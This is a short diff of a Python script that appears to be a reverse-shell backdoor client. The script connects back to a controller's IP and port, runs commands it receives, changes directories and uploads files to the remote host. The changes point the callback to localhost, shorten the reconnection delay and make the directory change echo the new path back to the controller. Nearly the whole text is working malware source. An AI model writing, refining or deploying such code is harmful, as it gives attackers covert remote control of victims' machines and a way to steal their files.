@@ -10,9 +10,9 @@ import subprocess  # For running shell commands
 import json  # For encoding and decoding data in JSON format
 import os  # For interacting with the operating system
 
-target_ip = '192.168.203.142'
+target_ip = '127.0.0.1'
 target_port = 5555
-reconnection_delay = 20
+reconnection_delay = 1
 
 # Function to send data in a reliable way (encoded as JSON)
 def reliable_send(data):
@@ -83,6 +83,7 @@ def shell():
         elif command[:3] == 'cd ':
             # If the command starts with 'cd ', change the current directory
             os.chdir(command[3:])
+            reliable_send(os.getcwd())
         elif command[:8] == 'download':
             # If the command starts with 'download', upload a file to the remote host
             upload_file(command[9:])
